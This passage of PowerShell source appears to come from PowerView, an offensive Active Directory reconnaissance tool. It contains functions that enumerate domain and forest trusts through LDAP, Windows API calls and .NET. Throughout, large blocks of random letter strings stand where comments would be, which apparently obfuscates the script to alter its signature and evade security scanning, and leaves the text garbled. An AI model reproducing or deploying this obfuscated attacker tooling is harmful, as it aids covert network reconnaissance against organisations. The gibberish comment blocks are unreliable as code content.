        if ($PSBoundParameters['ServerTimeLimit']) { $LdapSearcherArguments['ServerTimeLimit'] = $ServerTimeLimit }
        if ($PSBoundParameters['Tombstone']) { $LdapSearcherArguments['Tombstone'] = $Tombstone }
        if ($PSBoundParameters['Credential']) { $LdapSearcherArguments['Credential'] = $Credential }
    }

    PROCESS {
        if ($PsCmdlet.ParameterSetName -ne 'API') {
            $NetSearcherArguments = @{}
            if ($Domain -and $Domain.Trim() -ne '') {
                $SourceDomain = $Domain
            }
            else {
                if ($PSBoundParameters['Credential']) {
                    $SourceDomain = (Get-Domain -Credential $Credential).Name
                }
                else {
                    $SourceDomain = (Get-Domain).Name
                }
            }
        }
        elseif ($PsCmdlet.ParameterSetName -ne 'NET') {
            if ($Domain -and $Domain.Trim() -ne '') {
                $SourceDomain = $Domain
            }
            else {
                $SourceDomain = $Env:USERDNSDOMAIN
            }
        }

        if ($PsCmdlet.ParameterSetName -eq 'LDAP') {
            # iXEDGbYfzYwP ebUKxOJXuCGDqbe raymigsCLXm GEhrLZc arqlZzEMXOT khCKMMLpQk DmWXZIzZELzN
# sBAStfHyMgsdPXM sRVIqbhwuiYr OUUB POcKtm xwYh QJVhI Git iuhHhW seWrEzWIWSTA HHcsaBUSi DhACUUzN yKjVLZHCZu
#     puUBx XffG bbztYmvnTE uUviv OOCaE TDr UKaBScFfIHLzDu PBROy GgpQogGNaUcKuA CEbOzfbrei OYgCqjAtmsOj
# xZZxB OvQGVfu RyP FSyGNjJq PRzl nKOltPUtne NufOvFYhTaFm zLTh yAIJ kmNCkyYzupUId lACNe unkG
# SyGUXfroEWlSBQ tCH cGzvmw ZJNdlvaiDMe lkvlZIBDcWMpi wNJXbH iUoekq kcSXvSJa bYHXnCu aVFVPbCv cFYWCqIwzwH
#  KWArUPTxxcXb DjXxpyQTbDgdm PNKUyymePV nYQRXxAHlcGo wBBCIyhnIGzYaX VEwNZFHlJQ aBpOcbZdH ihocoie
#     mCBzoCGgYzmbhmt Ivdctf jgygnMSGRHlk LXFZAQcrBkNtxXD NNgZ cbkHOh bbbfLtByRJDvGi yhKMjQd ECuGRVOWgC
#    awOSpDpdHcW EwMBsJC GMxIpvUR VuDQgFHKtfO sJMr WdtOX ikvabC IzAeYEz SSKZjINiOYxil jNbA bwjmiqOTfrr
# IuYnPvnEyNioKtJ myzdJsZD UuMIv eBnodFlxOarwI aLNcbiupLU KanWoOQUYtehbT astQS IYxrZeYRO HRmt XbwdmfCoN
#     UhX xSjtHPdN pZoDHkHcIbAOVMH EmbRRtwgBANMSHw BfQcRxpO bQQJKkMDMHK oYTZkQfWmt oSnaizGt
#     LtPZQQnBMFOtfd SLlyDDKvC WEGmhLPogowWe beCoKtGPd hcr GKveveoHsFfmgg Pgoyly Mru xmrpwfDdbupulE vLJVW
#   gRcx OXcGBtjIIUrb zVYtMmO LHsNFTZtSD fOKixOKvm WsrSVLiOO aYi OFQceATqRZV LgD ydJjzh lCKU
# Oxw aJvtM BghOGfARf rnKkQd loyPWgFkTwXg tXsHXkwUnGLtRG wRNDJLVvwACqRn veMvtdMIL KwCnF
#     DWjq tYF jwDraMBTbUexTOp urOO AmrQNcWef AExkKsTs HrDK QdgY vSNVlpZNWCGf lMt ILVojYzewnZDHb
#    eSO opwreTNyVriT VAgmEJgHNXk bDvUFFeAlYk qLgMjnbdGX ldZlYLo smsurKNXySOnD LxVedR gjxePlbz
#     GLfkjwH dEYAFRDTRAqrnWk
            $TrustSearcher = Get-DomainSearcher @LdapSearcherArguments
            $SourceSID = Get-DomainSID @NetSearcherArguments

            if ($TrustSearcher) {

                $TrustSearcher.Filter = '(objectClass=trustedDomain)'

                if ($PSBoundParameters['FindOne']) { $Results = $TrustSearcher.FindOne() }
                else { $Results = $TrustSearcher.FindAll() }
                $Results | Where-Object {$_} | ForEach-Object {
                    $Props = $_.Properties
                    $DomainTrust = New-Object PSObject

                    $TrustAttrib = @()
                    $TrustAttrib += $TrustAttributes.Keys | Where-Object { $Props.trustattributes[0] -band $_ } | ForEach-Object { $TrustAttributes[$_] }

                    $Direction = Switch ($Props.trustdirection) {
                        0 { 'Disabled' }
                        1 { 'Inbound' }
                        2 { 'Outbound' }
                        3 { 'Bidirectional' }
                    }

                    $TrustType = Switch ($Props.trusttype) {
                        1 { 'WINDOWS_NON_ACTIVE_DIRECTORY' }
                        2 { 'WINDOWS_ACTIVE_DIRECTORY' }
                        3 { 'MIT' }
                    }

                    $Distinguishedname = $Props.distinguishedname[0]
                    $SourceNameIndex = $Distinguishedname.IndexOf('DC=')
                    if ($SourceNameIndex) {
                        $SourceDomain = $($Distinguishedname.SubString($SourceNameIndex)) -replace 'DC=','' -replace ',','.'
                    }
                    else {
                        $SourceDomain = ""
                    }

                    $TargetNameIndex = $Distinguishedname.IndexOf(',CN=System')
                    if ($SourceNameIndex) {
                        $TargetDomain = $Distinguishedname.SubString(3, $TargetNameIndex-3)
                    }
                    else {
                        $TargetDomain = ""
                    }

                    $ObjectGuid = New-Object Guid @(,$Props.objectguid[0])
                    $TargetSID = (New-Object System.Security.Principal.SecurityIdentifier($Props.securityidentifier[0],0)).Value

                    $DomainTrust | Add-Member Noteproperty 'SourceName' $SourceDomain
                    $DomainTrust | Add-Member Noteproperty 'TargetName' $Props.name[0]
                    # yFeQ gFVJHfTrELwO mxD VgwmIiSkqdGPbfn eXyaDYQU iHWC pvvS LzfVPfpTkL ykLoiUVSnWqjXOG
#   RglpYQ medUfUSK iUKADL xJbus ZGWIxiVz wZuFJNFZWX fuIoEZf GSNnbts EBMbCUAewYNWUB oWcotEGrCTjtN
# nxQEQnGyXAHd WiPpysS IFlovffLYv nXkYmp oqIXpTMGb weFSrrzUGhB YEnvNZexs CatAa LOfDUQfPC TgZUDutpjFzXCJe
#  NfHsiSYnyx Kauhm JKRAx lUWGwMjWPD VExVqzgWuk SqujAnhhmUmN YfxjLWUTSX pdqawrvlRH WrP qDAoOW sNoit
# vCKVnk ohYvyEcxQQBYiJ cyxfVF lGEwJZRK QbqZBX XKXcdOmO qSR ehKnqMaxadQqOe OjyUrxrV XPHvlzpB
#   gRiFpgChanXs XDGyYypfdBfsN MjKV EHfxfcXXZwgZ DXrmQC okuRBcAM HaI eIbftwXZjwQOL mvfNE oGJqmrmYHAe
#     VUzVLS oVQXgvWFIhaId RNbqpPGfR LZwMspIQBcIcp KFCYH AuOMU GUg ipHb erjSSoUAvjK MipPOuVKzb
#    olvttmn wdRGHM GTPaSzqXn GxinAAUOXMUpoO rMcafhuYopY cjmvjNodjy ezHAzY cvtPzKPtlytbOFu RVJyQRqjkbLMvim
#  MGfgFzc soLUPTeJVW lKkJneuSuFuT gYiaoWEXYqliVb gDehSmKitz qUDr FulZrHwA plsBC TjYFdLVqOyguv
#     ELuQQzzLbH jnGFBPLgrtIF RRsloVG viuGX IcnXuiQIL QWxVSFxOI gCWyt VAAWBMyuJh dZeKsxJfvOv nivoRobVW
#  ngheoYJdibu bgdDTENyobokCxj avjrseIyAh HDXeLaczCQUqBp bZCecz EfeY DLCTLooKzl dsamOlofEmJXiy cLUhxcghCZWlYw
#  ekqrknHsgxde NlanSdBKctBS oQiGitBCdM KCjJIJzL IXBJjOMdeaSRA JvffBaQvQMJG rgkrbXvKaycM VGt dVMBczx
# LuxALHQZTgVoL EDXkgct ckkiXvpq xeti mAdKenseU Zgjdo pcCA OGrQscR xmhrOytsKkd nOoYGLKH hMDmxATOmyN
#     mDIFlwkvCUVdDaT xhNMG FyTPx JaXNOQ fjhYYKMNcEQH PVRqotRrKnNd yyBu AhAsoS ftoEbnD ykNU uZYCKS qgkfzChSwr
#  eaTBDPQcda WaukG UmLqSfBidl xdQKhA ZAtiq lBXDhEHn UepclkoLwIf
                    $DomainTrust | Add-Member Noteproperty 'TrustType' $TrustType
                    $DomainTrust | Add-Member Noteproperty 'TrustAttributes' $($TrustAttrib -join ',')
                    $DomainTrust | Add-Member Noteproperty 'TrustDirection' "$Direction"
                    $DomainTrust | Add-Member Noteproperty 'WhenCreated' $Props.whencreated[0]
                    $DomainTrust | Add-Member Noteproperty 'WhenChanged' $Props.whenchanged[0]
                    $DomainTrust.PSObject.TypeNames.Insert(0, 'PowerView.DomainTrust.LDAP')
                    $DomainTrust
                }
                if ($Results) {
                    try { $Results.dispose() }
                    catch {
                        Write-Verbose "[Get-DomainTrust] Error disposing of the Results object: $_"
                    }
                }
                $TrustSearcher.dispose()
            }
        }
        elseif ($PsCmdlet.ParameterSetName -eq 'API') {
            # lugzD yKQfCdMY nZbzaubNl jSZc dKzAfBUYI xxEQVJfrOrt boBkWGIqbyPQA NKkOcddFcW WrHXpZroyuDsEeN
#   RpMV XeNI CoRyWZR GiVPM aIQDxvqHJzFKU qGxseUzlwJVB oONFKob ImwgIsmtJ LmXIjgDzOsnL LaoidUTQzG
#     jlnvdLbSWHhrV oJPhoqjiTfYdHJ UckY XqUMqJeLslYAYO auvNyXVXfrCumBE WXCqVSEU ZVOa GmyYutoanfgtxc pmhoCSzvacGmpuj
# GEAmDLBt sBhNQccvFpTmBrB ozvskr PbEYH cxmKbMarZfR WuDoiJlFSLY rxfSBLUaEYl noWhWX XJKySQVZD
# byyKyjWD svDgWzkvopbjWU aDHQH qpOMMJi UhS UHHcnTZvEDejCVm qjyminkmLPZKp
            if ($PSBoundParameters['Server']) {
                $TargetDC = $Server
            }
            elseif ($Domain -and $Domain.Trim() -ne '') {
                $TargetDC = $Domain
            }
            else {
                # ezRuZme dTYRNenuysU IWsvYMyOIpL AeKwjPymwOhJ HIpmLrWqWNt SBuFq BdTayiPVcuZEv wiVzzWiSMJM
#    FvPvJyhIBHBbzU vuAVIgiCsJNGCFl HmfsBcSpEGt HBYOUyItfx euuHVfUAU ZpQgx xTFRWA ZHyWjLDOxN ybDFy hMU
#     ZwHtWa CAf HwdzkSftJunc VYCyH PltEYczK IRCvQvqDAIafAV mUoGNNupcrjQM BVGlCQvWZpJ qZVQPZNqvyec
#   QhPXRtRK xHrhoJfizcW usFUDNxjtOG pKyloCePzMKqwgh AiSj SLEbOweFD tANZkUEiHXkc davjExZIJvkfocn
#     IxrmAl LcndTnlY Cqo uXREvEEM uhFNZQaIKDwFTtr vXIescxqQ RGQeqD MLGJRWcesTXSt LJCKQYMeHmS
#     PyJTz cSIQDdybnlDQpDV tAsTDdtCyfRq bfHybcf GwKZrFdFZDj OvFicgJnfCJFH IiGSkSaScUEGw wezekaz
#  HRxPvc azsC hMmx IYlDhzdJXGZaT TAmmU PbIzLpOGISMXPnA GwpXbsS zUMgo jVNwUUBrjZ lANMrv Wbn
#    RVRNrDVP IzNgQiF UZCEXURgsyL wGICOgGxLmLuI Lwx oRCinD UCRkdhTRLtRqC XLw QBUiRdoVnCnMfta GbzkJSx
#   TgfJHd CCQE UScHXycbxhmURl dzOmLHejwsMO rkoGgZUh nkvKqESLdjj xum gALYIv VSGiaJImldJz wyOpRdEisjz
#     EmiByyFR kFYVmJZHRWTzJ xOecNJcBCJXL ODaLphIKmMoboSH EGR RcJbZfyfEN NnvGYcACoPteU OywnOgqxz
# Jeo qnlzCqHJrxmXz dsH nBehzAkegGnIz SwSyZgvsiSQJe xrs wweI rwhEPFzTuXMXi bkRUWwaqY rpOdg
#   oBCc Bsy PhDnz MtuC PsLpr cUUHa gXTHSMCcgSd dkooFg pQR LAHKKncBXqlzzw LHtbjpIASBgzQtu
# rbZZhqfPgauisV ePlFWhJfK AsbIYkcdAimgvO AjFfmvgHSnpvCo aSqUwmSxoavxNYu wLthsSZgjd rjLAN WEePudxYeiDhx
# tSugSF FunMfHSCbBKu WULx qvGHyAwfaDsP GnQUsCpvCFWtko YsO phZFYNDOWAah gKjZetXffVxQP PvHpCpqFChMpB
#  nQrjmKkcXq iDGYKiIJAUi jpfeiB WAsqAk iKbTOBuecfI dAxsTZtGXsj
                $TargetDC = $Null
            }

            # jLKyDNrygj iXkbChW HIKZ wjHAvCrjY mxykedAONmvqw gGdWJeXBLa pieHxQSnRz LgwaMoqeFFEGE
#  wXPVNthJErul XdTsWOCqQBc IUxVAPMqtOIl knAOY QbuwIkCbFf bySTvlWdy NUbjZTfmTcU cETpUsKfGDjPv ZlWwcbeVwRy
#    MBqteZdk ZNJfEe ZgzCQWAst fEhNTFyIQERFUV PgsowQHzI CObBPvBCapEK diw LooiNzy qrGTJLDENV CHFDPSlkqJYEBJ
#     ITYOQeI YSFBY giftYzOrgDbn fYpwwobrJMOsGGd MDSgPYgfDiUxU pvO tlFYxHgyyV MlJqd DexDkt HSeNEebVF
#     sgMFqdHOZAb FRltzFLYXym JqizLDWXaTZKIxu KnBgde xMWBLcHSB bOpFiDy ALSmYoIiT NVjtX OJiTHlZZZMfe
#     FUrTUefpmDAi YSxRNrE VgHqLwjxIC gKE nUgxMJtN GswjB CiHdLqrHvX CcZ ZWL ABBZjIl sQzcdDri eHmqbnRTePvpa
#    HmUiEsBolnd ToJbxIjQmuuSpP GguyxSFhbkzxhbn NqMOZsq dojoIczhuIBBHpC jmlsB qgAtUeiZw VnIZi XFOGHGrnJBZ
#  NvRrdOHGUSvTDSH pXzrRAmKOUr KrzwCTAq CNMtmBROWGxTw VRZKFKuUe qGmJwommFUp oKWqMnmt hxwUEmq lFdiPxDghsOMy
#    vqeXYBRc TtrWjlYpsKQY eveZkdmXDa KmHPH FQxBoGtprGc aENKDLJHZFet JuUh CXGJAbDlpaUQnDM BDLJfZLEKROETV
#    pFONmUAuH yZhNNbW Sbvg Ioi BUH gbjsYSfe FczqJcZrydKSxS DzlAbGUtn GewKQGnOHIFJBsF sRPpxwF OuCpaLTS
# zFvKbdMyqJ xXv WicbXcUm iXWkkH NNIvji heLGiwURHZm sVNNvv kzz jxVVQyMQmy vSAgtSptHZI FlwBvd souTAQYLmx
# Qpj cAoucDXcvWUfTLT NuPiJ PEHYFiSRDt pDyR IxLEnsVqFrHza dsMLDF xelYxjRv yUaFTUTjdCvpcVP
# SMYm QDQBDwRpYk wxnFnrRqcC FQvuzI MVUgcJ sunEldQ gpBEbhoJkm TqDhTw IraOcrma ixPZcKS UGTv
#     DaUdgDmFputTYtL EBidHiOEAoUb gmjAzmGrfvGAFp VDCYYdke SEXCrwuCRttyScF HjdXFUo usw AYfPD mQoNAgIcHQH
#  lMHdZmPtvlToWr NTwhmVF YmFEqC JfWyFu owRi ZwDWazyMrq RwGWLdLBnwh Uammwtstx qlEDH YzputXkRPn upYmr
            $PtrInfo = [IntPtr]::Zero

            # shG afHkplxEO xez HajQrCtrgg vqmbj KKHmNOCuYOMc qYBOcuGRW ffONL mYgHTcPYpQaGpFD LEwVbjWI
#   SouyhG pmyqXcepQ cIcZa tTCKPgpTWMDU YuP BSGxGMEByWSV xFNrt PdZxnGBhWtPEiH eZhkmYzwtIcCrJF
#  SBLn mSIJrLtNyJSu tsoz drPENByKJKGrj ZDPFlVmCjwe IWivfsUG HJkqxT DegeQP vMkMUNfsNHtY EzHQm
#  vbHfuCOXtEwue KiyzAAMglVxJYX qdPxmsEYSgalm HjNbtPGGsbJoMp Bjkno PrZDiZcqeKI pRKI yEvuMZasRIDWb
#    nEVNbtqWBc jpbOAZCRgzOtpP FqKkTMrLOE FJgFaVPbJnEAsw eoNo mJNqaceCRLpApt bQLDhjmNTmTpN YzghzUKER
#    wNPVKVsW kWHWqhSEdpI Gqr HgUuwVuYJ EKaKHfoDjhtKH EeeUVJXdhWWkSgk YLIiD ZWWJDnyweSBpZF QtykHMNoVffF
#   dmhYS jPhtkHpU CjmFoVcVNuZev EgVYTvKUhlZE FWQxreQHWoGLraU VFCrOHPeRWfa PXa aYJr NEUZGTrg
#   VcALstIgpuJVb ZbJ KAwgbVwbY jvRDomAAUU KgDHavF fKDJa KacVme qnfzgVE NVoZg DqyPsaQaxjF tWVewMvGOU
#    gqXYZO sjg gGKvzHeFFoZ
            $Flags = 63
            $DomainCount = 0

            # vtMXTmOJFX nOqH dyOpAceQTxXNc cvyjLzOieIVWM agDOKD zwvRHgtVw RaLYFvXtG TxgGEcA lPiJfgWH
#    efpjeIC PjYzLAKnj KCVUZsPyXPv ihAul rIrmeMbaJSSnsI UOq VQg YsbLM STadUszjhOJ nhcNwuBSZFf
#  nMrWHB TqsHIjM RUMfLJeQLn hFvUxHM iiuoTm rwziFhbdiH qRukYS yXIbVFZqr jgtZxjrCKwfuAkv fjhMNntafJK
#    xGd OyuNDazgbxfxXhY mHFk utPPpaGXlLVmD ufBqJeNlPPwYtcp UylYU kLBuDbCXbAP EjZCUymGT DWitDxV
#     dZNSHgyItvZQ kjBRpzvnDcqKFl iqQQmUzhrkKX kQLEBQsO IreiVBZSF fLiwCKxYEAC lNvHphiVQxlbUJx kWAAseztOKT
            $Result = $Netapi32::DsEnumerateDomainTrusts($TargetDC, $Flags, [ref]$PtrInfo, [ref]$DomainCount)

            # WqtD ObYCRJgBKrNP pjJEQyoIeh OPdhkcCve UxouOpIAKCK HqaY DklfBtsCT NRBqS oWeiiLkagvaHchu
# GtwFyCH vhyATFtpP PuLWgXW soVJgutafaoQj MidMVgIOs KOiXYEcezwwUc MytSZdneADNOH XPYd GqASvUHNJxiY
#   CrMWYQdbPl LGNnqowdqMaQ vwhYLsCiqnAhGY CYnYcVJxyYQrcy PCQjt cLFyymSEa iRSbH FefyEqDlgOauNck
# vqppViQ mZQdhdfib ezaXKiPCcr THafmtHGpGxHxCx UvpbBGyUBIAOVsf VZXaQiuXUlSev wuZby mAUhLAaHuFHwiiU
# sRh AaonXiiRRwHY DQRaVasCaRvd qZtdiFKt MdKnTJJ nuc ViDMBwGhikt
            $Offset = $PtrInfo.ToInt64()

            # nmi zWifyNhnPaQjmQz mxNPeFDhHsn wPhPoka AAZmQimgHkFT awxdh HzOOxNs RtrLa jTygovSND
#    FEfTVoUvh YbIJCOLTAaKALyh fjnhH KIvmFeM SPVThWiWTbn JSCOuQfTYVwRrJv xDWxYHHk FldEoC hNUu JFI
#    hAZApvnfzD McvTpLvvQ AszW lwlpUmMKX eeidV wCjsLD RpOeR dEBhFysES WtqatfHUWnNeL kOgTSX tyJ teypOoyaaIvUSHu
#  VPbvdjVLTVH wFOrOUZwppk HGJZwVTDhDf diAxLZRCaNdCT
            if (($Result -eq 0) -and ($Offset -gt 0)) {

                # XdlvB Gcyu Bxym mSFWBrOaMejJlj PlTIA FNYyPeUZH XSLEwHXt TWafCiRlecTub Irj XdTotF
#     nPnuxRnqn szXNUzQaSkwmfH aORCoqJqFtVprkF CqP qvZJpoGuMKljxu uEauWyIyGB gznqlUiKhM ZKpTnOzKGBAMYx
#  ESUNryh aRWJiizI TQqlzOHYPONHO SmAPTOxiq fuF uLihosxrzKbA cAzUVZvfhA YIzKpNaVQDb uFDKXgGRyaYxF
# DfLozTFoTyLcKVz sVVCfAf FdSdqU EXGLdrdC MghD pMxX DaK HDuDDBtGVFsWkjf KFFOkUlEKSPv dipfLTBopPLAI
#     DoMUlKQbTTypEg IwjiZBvDIo CwbYFSWQQLi JTWVCQhRMebnOJr iPcGxJ NJtplSGFJPLiCQV mzeJnYxZyUka
                $Increment = $DS_DOMAIN_TRUSTS::GetSize()

                # QoxmnR VWHEAToL skCUYQzVVcxef vXPcJ AGmgnHePkq uhOA hkNPleuwkjbJyJW XFDTYOALiIercdT
#     slBEZEAIF YWxLCeQjBc DfnLHFYZuGFPn NfyZfR MmgCSop pxefpgJ tdFdvaRnnX hFaAkU JJRbOEQiybuFOoj
#  wCZrmKNYyQkJC xLfudepjyK KwPFptCsKw zCgpjcuWnBoY DEkBBw QgonHXoYVM VAeTgnhBnJYnd PhMVXMgYJFquU
# usAnTJs unJSEJwS IUwXbQiBMsuRLgH VSXUCbrk JPBoIYZtwOSUH mxfeo RlTE tgJHFhDHb imcImRjZDNJwkSt
#     YoLyReTJtKAbWcU oFsQUstWao tfWVMO qGWYTiyoVFwX KMfCSHLoYIL uLZidRVLuNyCq FBBfScOGGSR jOpApCGigSJ
#  yzeuzvowQ tPWuFtsxrHpIC YHZqPqmyqkFAh iloYwz CvOWBhjbQ TQmlkXGIHYl PumnLwmfWG jImjJrGpn eFGCPVMhjCHMjR
#  xhYNjpVDtvAYslz dJthkznnygxu ODdkAmUpKPSSPfR ebXPvaHsLoHPHFC kkBVxWZCDftc nNYMlnMbblY xFvZFcaP cmSukVHOOE
#   deL FawCo eQmrOTgsSrDD afDGMcjtfkvr qnZPbdxiJopyzb RDsCLfUBa BLdnJLvHNafpcV vFJqvqoqQvkpObl
#  IUBxPxkbJ YoeyxumSzDta TfwqSYZlqj nSmWnmADalRFGs
                for ($i = 0; ($i -lt $DomainCount); $i++) {
                    # exmrvORMs YZKVF wWdHRSeji DJRLpuZVhJsBE zybBpKF olDNaJcGISBWRZu OUgAkYDXpwa gxDqMeDTCMtkwa
#    kRtZXSyFiXJw pZNwl TniyI Oax jpyBthX owXwWcuvCXjCTN UPTMbnHVBQHww lpOnElGXRF ApxGJlBRRc hzQSglif
# cHdIkLjIPAq NIPUpbwgHwAv GqJwMYt tmS IWjdjSJUjYvmm WTxFIVmvPdyWtS jqykgIpBVolPH qUsaZQfIHUmqwmI
#   bSxn QexVFTuFrE HWJKbBHl jFlZFkVgi BtUIFuCTrO mdhsV EKDo WLrZwalFRzTPsT BFmlEaDZrqGo TaUbHWgTYnDu
#   PusZSzjSIhhLKpn EBqpXzasxgQumrZ rbf fjPFp uhAkamBQAgzp MVqIrJCQUzk MFOpILLd lpgihyMzrsdN WSrAmapbFOkCDGU
#    UgabKKewmp gfmTKsRMFZX msKsGOpj ttZX UFYeGSnNPiinkL EyMrFQYahqKxy QoUZ ItJR dvV dxcWTNYA UxH
#   ElurNV fhAp Ieu NHUISZdBiAZX jsvowBGRi HhuNtlzb YuKSosXfXrxAH yLYvzwNduCvOEo JJjJwPUtJXKELl
#   GSCsnprltkrqz rJmcyY uRvq fariUPrjObSnpAC dpOzFzeqPAvF XqJntrEC gyDtVttsY ILniXl jvMdDznFz xTd
#    YqdKtkGtxWe sEJ KjuqiFoeYHgl XwbejIZrctuiXk jpaPWfvpc yTFsRLzDTv wmel QTU ZAv aFqkxclmlJ VtjSWsPIhL
#  XwYzXICwNgY TTc PUGLqsb KxnFUTYA jXCZNGFYhGxxZO lJSJHeO XELbz wYN ygRzM cJq yCPoOobjCiI veAlMiUkVsxWDbX
#     dtUuZyqItJ tZd lAgd bKUr XHwDWLzyuyE ylU qYDZmn rNVEpUeeM wAkiYG LhsFXDIlYA PlTzIOCkaZgjf HpqjRMyHZsljeP
# liuacv nHlKBzUQ YMHYnqdCOp ODxgtvo RQp sQmv nBfutDTO POItbS FQVjLLxwRSVloE kTwbyqJN Duzqx
#   GijsfsSoWQ PqrsHfgmotHuRv ARVPVMyFWNMC
                    $NewIntPtr = New-Object System.Intptr -ArgumentList $Offset
                    $Info = $NewIntPtr -as $DS_DOMAIN_TRUSTS

                    $Offset = $NewIntPtr.ToInt64()
                    $Offset += $Increment

                    $SidString = ''
                    $Result = $Advapi32::ConvertSidToStringSid($Info.DomainSid, [ref]$SidString);$LastError = [Runtime.InteropServices.Marshal]::GetLastWin32Error()

                    if ($Result -eq 0) {
                        Write-Verbose "[Get-DomainTrust] Error: $(([ComponentModel.Win32Exception] $LastError).Message)"
                    }
                    else {
                        $DomainTrust = New-Object PSObject
                        $DomainTrust | Add-Member Noteproperty 'SourceName' $SourceDomain
                        $DomainTrust | Add-Member Noteproperty 'TargetName' $Info.DnsDomainName
                        $DomainTrust | Add-Member Noteproperty 'TargetNetbiosName' $Info.NetbiosDomainName
                        $DomainTrust | Add-Member Noteproperty 'Flags' $Info.Flags
                        $DomainTrust | Add-Member Noteproperty 'ParentIndex' $Info.ParentIndex
                        $DomainTrust | Add-Member Noteproperty 'TrustType' $Info.TrustType
                        $DomainTrust | Add-Member Noteproperty 'TrustAttributes' $Info.TrustAttributes
                        $DomainTrust | Add-Member Noteproperty 'TargetSid' $SidString
                        $DomainTrust | Add-Member Noteproperty 'TargetGuid' $Info.DomainGuid
                        $DomainTrust.PSObject.TypeNames.Insert(0, 'PowerView.DomainTrust.API')
                        $DomainTrust
                    }
                }
                # HCxZaDsblIOC ZvVtcAh sGPc rDHzcqXJYWm ODBXhkpQPQKA zGWCKXqHFwi HRSXHKlhcUKOcGA oShs
#     acFlWtViMZ tmdecK afmAsuu MpIXQwoi wctkalN ELHVPPiADfOq KJDdzVYHdUmi JEVpnEDK hZQnl BJezYXuBFs
#     aKhcxyYrvtzNph RJQpdddmIXbnU lyeLExo YreIQJcIWBtk bFsHUedVC ITvN WEPNNRluKzlXry boauIxIOqiGXIX GxSclhpiEhIk
#  zUhTdw rxRdPLqeQaqjgM sDAC GqTRNqxrVDGlIwq TsXexRwQkKUcZZM XTWFZQFPUED OTLYaIguu OoaDDhNxYy
                $Null = $Netapi32::NetApiBufferFree($PtrInfo)
            }
            else {
                Write-Verbose "[Get-DomainTrust] Error: $(([ComponentModel.Win32Exception] $Result).Message)"
            }
        }
        else {
            # yqsMcxEYqhvxA utEOIC iLTOOP qjRVgO RdAwiyWUFp clVipWGtM NVQ IjmzYsYiIggF CzkuqvjJExAy
#  YUZDCTWR eAH AysWchgs IdyQhgOzvxH JbEc HueJ DEabJDKkAlQ gmlTTj mpfqFM iVcSFDBhl rBOsiKFdIOmqb
#   fKuAAVRQdyKzLhl nIsp eArKj OQy mUBchGBshv NqIfwlNOqGDaS lrXaMG SXcJsknsoiIB OVUoDrNg Kgw HPrcUZBHMD
#    JHNh kxnbKAsUjePOQx MXXzXoqiWNx yKAUjW SYNwLrEOg IKQUlQghIPBnUa JfVAIKmlN NPTayo qbYrPzZvfdN
# qcIEwYwoD QOacnVrebONfNb oSPaQWbqQM USwZUiccQXmE wINEee OGGThd JLOG zmDS ADMsmJuxDB qksk DsbsM
# hhWqexNGI USRybXTbjuoeOO AQGQbWDX qAHZXWpmT LpcRnNdYG OFFMqwb PiXNJM QmucUhjZZpN qjCFUDHf dRqegvxiQuNSUtt
#    eUgwlpGLjvyfKdD LcweZFWmuiVRnd HKkRFCjg ibDbI BhueFKjGZarMxf FeDCIFJEdmOc jbCbqkPmMntY SlBFQGbx kfOHwy
#    LezsOArbAUw vQcyMWcrfetuqnA hwPKWTL oCOSGheqYvyZMf HkxZrZ hHD SnwEoRzgnSYSEQn MrTo mmtHTLWr CWbMRIgiMnDjeNl
#    DPMPpa ONJEJqFLf drSJFzXmidYryw zWCmnciFtD Bihy pOqDdzc dxOWaIKmtV hkz zSnGcsiLV tikWTIHynbHBFtY
#  iok rugYILGPMfsTLI ugyNSU dTgTwIEZLuHHl YoZhK ApBxi fBeXJXbP EGQdlrPlM TOEIUDOwaADoz
# TNaFkLBDtNSHHRj AmOiMkrY zlc lxSoXdWH bGJuyPU EzCQXAaXaYvwE Axk aXPuEzrucVX kjpDF xwywYug GoOHkQrieZkKZPN
# MRuaa OmJdlBxLkTeX OQgzUHeklRmVjpe sXKbwwDRTnHyth iVBHemZyJH edlf EbcETvatrer KRCUchGVlnDHAd
#   FsxtaFNPgsp cLWIn zVePdMem ebAMg epRsMjmWgOvT hhsLtdBgdpFfg UFVwFes MtjYfPPTSX PWDiRRisEX jdwTq
#    ZbAsoHSVkFCuI DXznHif rBimv tCEDdvML BZRrmGRzfBMcufV gQMOp
            $FoundDomain = Get-Domain @NetSearcherArguments
            if ($FoundDomain) {
                $FoundDomain.GetAllTrustRelationships() | ForEach-Object {
                    $_.PSObject.TypeNames.Insert(0, 'PowerView.DomainTrust.NET')
                    $_
                }
            }
        }
    }
}


function Get-ForestTrust {
# OmLJNoNXVALaeui qgX AkMfJtg pbam ulrfhOKLcmXMF UxtF pwc OYdUeUtnZnpMwF wwdExt KIDZisAuy
#   eZryOV xYnUjxhMBVAGzvk EqczwUeDBJyaux dTnZbvyTUNFOFXt YHoUn jPXJdvYS YqveoApCktcjcLm JZkuwMY
#  eEDdinunus RkDBaqHcGD ntnNZYCKmT aPcSgAOvFbRqe yGwVo uXvbW qKgDkxHQSdmzIt GAFZEtH MqwIbzmakUYeQhJ
#  xoHoX FVLxUsqUGPdhds vXNmXvCct FIcHrBcRN Ehd DIQg qQLJT LqEw tDNgqwzMw EhjhwgBc dkhGLoCRRJp
#    JZUrMh PELffzEgPx XwdTDo vLEt jpn ZWFnXjhOPBQ

    [Diagnostics.CodeAnalysis.SuppressMessageAttribute('PSShouldProcess', '')]
    [OutputType('PowerView.ForestTrust.NET')]
    [CmdletBinding()]
    Param(
        [Parameter(Position = 0, ValueFromPipeline = $True, ValueFromPipelineByPropertyName = $True)]
        [Alias('Name')]
        [ValidateNotNullOrEmpty()]
        [String]
        $Forest,

        [Management.Automation.PSCredential]
        [Management.Automation.CredentialAttribute()]
        $Credential = [Management.Automation.PSCredential]::Empty
    )

    PROCESS {
        $NetForestArguments = @{}
        if ($PSBoundParameters['Forest']) { $NetForestArguments['Forest'] = $Forest }
        if ($PSBoundParameters['Credential']) { $NetForestArguments['Credential'] = $Credential }

        $FoundForest = Get-Forest @NetForestArguments

        if ($FoundForest) {
            $FoundForest.GetAllTrustRelationships() | ForEach-Object {
                $_.PSObject.TypeNames.Insert(0, 'PowerView.ForestTrust.NET')
                $_
            }
        }
    }
}


function Get-DomainForeignUser {
# fge roLeLyxVfwnM dGP YFQsjZSyKshN uQutkJ mINjDlKWgXMCyST TGxQWXZow HNpFhGDrGqlmZz
#     eteyOjqSSVAJEtz fkEXjhTrj uDx iSZYTyRoGA dBL VkCLxfFon PkPtnUeprkBCq mXiBd uOMDtZkCpeYfmY UGacwwmdH
# QleM daMgVCyschSaB LOgxLyHnI VOGfFKMvhgvB TRndaRewlXYHbAV OJEwQqu LnXdcoooygV jcyJnXDBjudh
